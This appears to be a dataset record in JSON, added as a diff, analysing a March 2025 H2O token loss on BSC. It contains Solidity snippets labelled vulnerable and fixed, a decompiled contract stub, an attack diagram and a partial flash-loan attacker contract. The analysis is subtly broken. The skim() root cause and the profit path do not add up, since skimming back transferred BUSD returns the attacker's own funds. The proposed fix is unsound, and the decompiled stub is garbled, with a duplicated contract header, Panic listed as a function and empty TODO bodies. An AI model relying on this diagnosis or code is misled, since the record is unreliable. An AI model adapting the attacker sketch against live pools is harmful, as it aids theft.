@@ -1,0 +1,30 @@
+{
+ "id": "2025__2025-03-14_H2O_PriceManipulation",
+ "source_file": "2025/2025-03-14_H2O_PriceManipulation.md",
+ "title": "H2O — AMM Arbitrage Analysis via Price Manipulation",
+ "date": "2025-03-14",
+ "protocol": "H2O Token",
+ "chain": "BSC",
+ "loss_raw": "22,470 USD",
+ "loss_usd": null,
+ "root_cause": "Missing access control on `skim()` allows anyone to trigger reserve imbalances and manipulate AMM pricing",
+ "attack_tx": "0x994abe79...",
+ "vulnerable_contract": "0xe9c4d4f095c7943a9ef5ec01afd1385d011855a1",
+ "classes": [
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "❌ Vulnerable skim() function: callable by anyone, exploitable for reserve imbalance\nfunction skim(address to) external {\n    address _token0 = token0;\n    address _token1 = token1;\n    // If actual balance exceeds reserve, send the difference to `to`\n    _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)) - reserve0);\n    _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)) - reserve1);\n    //",
+  "❌ No access control: callable by anyone\n}\n\n//",
+  "// File: H2O_decompiled.sol\ncontract H2O {\ncontract H2O {\n\n    // Selector: 0xa9059cbb\n    function transfer(address a, uint256 b) external {  // ❌ Vulnerability\n        // TODO: decompile logic not implemented\n    }\n\n    // Selector: 0x9dc29fac\n    function burn(address a, uint256 b) external {\n        // TODO: decompile logic not implemented\n    }\n\n    // Selector: 0x4e487b71\n    function Panic(uint256 a) external {\n        // TODO: decompile logic not implemented\n    }\n\n    // Selector: 0x313ce567\n    function decimals() external view returns (uint8) {\n        // TODO: decompile logic not implemented\n    }\n\n    // Selector: 0x95d89b41\n    function symbol() external view returns (string memory) {\n        // TODO: decompile logic not implemented\n    }\n\n    // Selector: 0x18160ddd\n    function totalSupply() external view returns (uint256) {\n        // TODO: decompile logic not implemented\n    }\n\n    // Selector: 0x70a08231\n    function balanceOf(address a) external view returns (uint256) {\n        // TODO: decompile logic not implemented\n    }\n\n    // Selector: 0xdd62ed3e\n    function allowance(address a, address b) external view returns (uint256) {\n        // TODO: decompile logic not implemented\n    }\n\n    // Selector: 0x6ac5db19\n    function max() external view returns (uint256) {\n        // TODO: decompile logic not implemented\n    }\n\n    // Selector: 0x095ea7b3\n    function approve(address a, uint256 b) external {\n        // TODO: decompile logic not implemented\n    }\n\n    // Selector: 0x23b872dd\n    function transferFrom(address a, address b, uint256 c) external {\n        // TODO: decompile logic not implemented\n    }\n\n    // Selector: 0x8da5cb5b\n    function owner() external view returns (address) {\n        // TODO: decompile logic not implemented\n    }\n\n    // Selector: 0xb15be2f5\n    function renounce() external {\n        // TODO: decompile logic not implemented\n    }\n\n    // Selector: 0xa8aa1b31\n    function pair() external view returns (address) {\n        // TODO: decompile logic not implemented\n    }\n\n    // Selector: 0xb8bf0fc3\n    function _o2() external {\n        // TODO: decompile logic not implemented\n    }\n\n    // Selector: 0x3eaaf86b\n    function _totalSupply() external view returns (uint256) {\n        // TODO: decompile logic not implemented\n    }\n\n    // Selector: 0x7462ae73\n    function getRandomOnchain() external view returns (uint256) {\n        // TODO: decompile logic not implemented\n    }\n\n    // Selector: 0x06fdde03\n    function name() external view returns (string memory) {\n        // TODO: decompile logic not implemented\n    }\n\n    // Selector: 0x40c10f19\n    function mint(address a, uint256 b) external view returns (uint256) {\n        // TODO: decompile logic not implemented\n    }\n\n}"
+ ],
+ "code_after": [
+  "✅ Improved code\nfunction skim(address to) external {\n    require(msg.sender == factory || msg.sender == owner, \"Not authorized\"); //",
+  "✅ Access control\n    // ...\n}"
+ ],
+ "steps": [],
+ "other_code": [
+  "Attacker\n  │\n  ├─[1]─► PancakeSwap V3 Flash Loan (borrow BUSD)\n  │\n  ├─[2]─► Transfer large amount of BUSD directly into H2O/BUSD pool\n  │         └─► Pool actual balance > reserve (imbalance created)\n  │\n  ├─[3]─► Call H2O pool.skim(attacker)\n  │         └─► Excess BUSD transferred to attacker\n  │\n  ├─[4]─► Swap H2O tokens (realize profit after price manipulation)\n  │\n  ├─[5]─► Repay flash loan (BUSD + fee)\n  │\n  └─[6]─► Net profit: ~22,470 USD",
+  "contract AttackerC {\n    function attack() external {\n        // [1] Borrow BUSD via PancakeV3 flash loan\n        PancakeV3Pool.flash(address(this), 0, BORROW_AMOUNT, \"\");\n    }\n\n    function pancakeV3FlashCallback(\n        uint256 fee0,\n        uint256 fee1,\n        bytes calldata data\n    ) external {\n        // [2] Transfer borrowed BUSD directly into the H2O/BUSD LP pool\n        // This causes the pool's actual balance > reserve imbalance\n        IERC20(BUSD).transfer(H2O_BUSD_PAIR, BORROW_AMOUNT);\n\n        // [3] Call skim() to claim the excess balance\n        IUniswapV2Pair(H2O_BUSD_PAIR).skim(address(this));\n\n        // [4] Swap acquired H2O tokens for BUSD to realize profit\n        // swapExactTokensForTokensSupportingFeeOnTransferTokens(...)\n\n        // [5] Repay flash loan\n      "
+ ]
+}
